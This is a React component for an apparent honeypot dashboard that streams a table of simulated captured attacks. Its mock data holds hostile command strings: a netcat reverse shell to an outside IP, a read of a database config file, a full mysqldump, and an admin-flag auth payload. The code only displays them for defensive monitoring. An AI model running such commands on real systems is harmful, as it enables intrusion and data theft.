'use client';

import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ShieldAlert, Terminal, Pause, Play, ArrowUpRight } from 'lucide-react';
import type { Attack } from '@/types';
import { getRiskBgColor } from '@/lib/utils';
import Link from 'next/link';

interface AttackStreamProps {
  initialAttacks: Attack[];
}

const simulatedIncomingAttacks: Attack[] = [
  {
    id: 'atk-sim-001',
    timestamp: '10:25:02',
    sourceIP: '192.168.14.45',
    honeypot: 'SSH-HNY-01',
    action: 'cat /var/backups/database.conf',
    behavior: 'Credential Access',
    risk: 'CRITICAL',
    sessionId: 'sess-001',
  },
  {
    id: 'atk-sim-002',
    timestamp: '10:25:18',
    sourceIP: '45.33.32.156',
    honeypot: 'API-HNY-01',
    action: 'POST /v1/auth/token {"admin":"true"}',
    behavior: 'Brute Force',
    risk: 'HIGH',
    sessionId: 'sess-004',
  },
  {
    id: 'atk-sim-003',
    timestamp: '10:25:44',
    sourceIP: '91.240.118.222',
    honeypot: 'DB-HNY-01',
    action: 'mysqldump --all-databases',
    behavior: 'Data Exfiltration',
    risk: 'CRITICAL',
    sessionId: 'sess-005',
  },
  {
    id: 'atk-sim-004',
    timestamp: '10:26:10',
    sourceIP: '103.45.67.91',
    honeypot: 'SSH-HNY-01',
    action: 'nc -e /bin/sh 103.45.67.91 4444',
    behavior: 'Lateral Movement',
    risk: 'CRITICAL',
    sessionId: 'sess-003',
  },
];

export function AttackStream({ initialAttacks }: AttackStreamProps) {
  const [attacks, setAttacks] = useState<Attack[]>(initialAttacks);
  const [isStreaming, setIsStreaming] = useState(true);
  const [hoveredAttack, setHoveredAttack] = useState<Attack | null>(null);

  useEffect(() => {
    if (!isStreaming) return;
    let index = 0;
    const interval = setInterval(() => {
      if (index < simulatedIncomingAttacks.length) {
        const nextAttack = {
          ...simulatedIncomingAttacks[index],
          timestamp: new Date().toTimeString().split(' ')[0],
          id: `atk-stream-${Date.now()}-${index}`,
        };
        setAttacks((prev) => [nextAttack, ...prev.slice(0, 11)]);
        index = (index + 1) % simulatedIncomingAttacks.length;
      }
    }, 4500);
    return () => clearInterval(interval);
  }, [isStreaming]);

  return (
    <div className="card-interactive p-5 relative overflow-hidden flex flex-col bg-white border border-stone-200 shadow-xs">
      <div className="flex items-center justify-between pb-4 mb-4 border-b border-stone-200">
        <div className="flex items-center gap-3">
          <div className="p-2 rounded-lg bg-rose-50 border border-rose-200">
            <ShieldAlert className="w-4 h-4 text-rose-600" />
          </div>
          <div>
            <h3 className="text-sm font-bold text-stone-900 tracking-wide flex items-center gap-2">
              Live Attack Activity
              <span className="relative flex h-2 w-2">
                {isStreaming && (
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-500 opacity-75" />
                )}
                <span
                  className={`relative inline-flex rounded-full h-2 w-2 ${
                    isStreaming ? 'bg-emerald-600' : 'bg-stone-400'
                  }`}
                />
              </span>
            </h3>
            <p className="text-xs text-stone-500 font-medium">
              Real-time honeypot sensor telemetry and command capture
            </p>
          </div>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={() => setIsStreaming(!isStreaming)}
            className="flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-stone-100 hover:bg-stone-200 text-stone-700 transition-colors border border-stone-300 shadow-xs"
            title={isStreaming ? 'Pause stream' : 'Resume stream'}
          >
            {isStreaming ? (
              <>
                <Pause className="w-3.5 h-3.5 text-amber-700" />
                <span>Pause</span>
              </>
            ) : (
              <>
                <Play className="w-3.5 h-3.5 text-emerald-700" />
                <span>Stream</span>
              </>
            )}
          </button>
          <Link
            href="/live-attacks"
            className="flex items-center gap-1 text-xs font-bold px-3 py-1.5 rounded-lg bg-amber-50 text-amber-800 hover:bg-amber-100 transition-colors border border-amber-300 shadow-xs"
          >
            <span>Monitor</span>
            <ArrowUpRight className="w-3.5 h-3.5" />
          </Link>
        </div>
      </div>
      <div className="overflow-x-auto min-h-[340px]">
        <table className="w-full text-left text-xs border-collapse">
          <thead>
            <tr className="border-b border-stone-200 text-stone-500 uppercase text-[10px] tracking-wider font-bold">
              <th className="pb-2.5 font-bold">Time</th>
              <th className="pb-2.5 font-bold">Source IP</th>
              <th className="pb-2.5 font-bold">Honeypot</th>
              <th className="pb-2.5 font-bold">Captured Action</th>
              <th className="pb-2.5 font-bold">Classification</th>
              <th className="pb-2.5 font-bold text-right">Risk</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-stone-100 font-mono">
            <AnimatePresence initial={false}>
              {attacks.map((attack) => (
                <motion.tr
                  key={attack.id}
                  initial={{ opacity: 0, x: -16 }}
                  animate={{ opacity: 1, x: 0 }}
                  exit={{ opacity: 0, y: -10 }}
                  transition={{ duration: 0.35 }}
                  onMouseEnter={() => setHoveredAttack(attack)}
                  onMouseLeave={() => setHoveredAttack(null)}
                  className="hover:bg-amber-50/50 cursor-pointer transition-colors"
                >
                  <td className="py-2.5 pr-3 text-stone-600 font-medium whitespace-nowrap">
                    {attack.timestamp}
                  </td>
                  <td className="py-2.5 pr-3 text-teal-700 font-bold whitespace-nowrap">
                    {attack.sourceIP}
                  </td>
                  <td className="py-2.5 pr-3 whitespace-nowrap">
                    <span className="px-2 py-0.5 rounded bg-stone-100 border border-stone-300 text-stone-800 text-[11px] font-semibold">
                      {attack.honeypot}
                    </span>
                  </td>
                  <td className="py-2.5 pr-3 max-w-[280px] truncate text-stone-900 font-mono font-bold text-[11px] hover:text-amber-700 transition-colors">
                    <div className="flex items-center gap-1.5">
                      <Terminal className="w-3.5 h-3.5 text-stone-400 shrink-0" />
                      <span className="truncate">{attack.action}</span>
                    </div>
                  </td>
                  <td className="py-2.5 pr-3 text-stone-800 font-medium whitespace-nowrap text-xs">
                    {attack.behavior}
                  </td>
                  <td className="py-2.5 text-right whitespace-nowrap">
                    <span
                      className={`inline-block px-2.5 py-0.5 rounded-full text-[10px] font-bold border ${getRiskBgColor(
                        attack.risk
                      )}`}
                    >
                      {attack.risk}
                    </span>
                  </td>
                </motion.tr>
              ))}
            </AnimatePresence>
          </tbody>
        </table>
      </div>
      {hoveredAttack && (
        <div className="mt-3 pt-3 border-t border-stone-200 flex items-center justify-between text-[11px] text-stone-600 bg-stone-50 px-3.5 py-2 rounded-lg border border-stone-200/80 shadow-xs">
          <div className="flex items-center gap-2">
            <span className="text-stone-500 font-medium">Target Node:</span>
            <span className="text-stone-900 font-bold">{hoveredAttack.honeypot}</span>
            <span className="text-stone-300">|</span>
            <span className="text-stone-500 font-medium">Command:</span>
            <span className="font-mono text-amber-800 font-bold">{hoveredAttack.action}</span>
          </div>
          <span className="text-stone-500 font-medium">
            Session ID: <strong className="text-stone-700">{hoveredAttack.sessionId}</strong>
          </span>
        </div>
      )}
    </div>
  );
}
